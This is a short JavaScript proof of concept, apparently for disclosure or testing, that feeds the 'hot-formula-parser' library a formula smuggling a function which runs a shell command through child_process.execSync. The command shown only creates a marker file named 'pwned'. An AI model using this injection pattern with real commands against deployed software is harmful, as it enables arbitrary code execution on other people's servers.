var FormulaParser = require('hot-formula-parser').Parser;
var parser = new FormulaParser();
 
parser.parse("SUM([(function(){require('child_process').execSync('touch pwned')})(),2])"); 
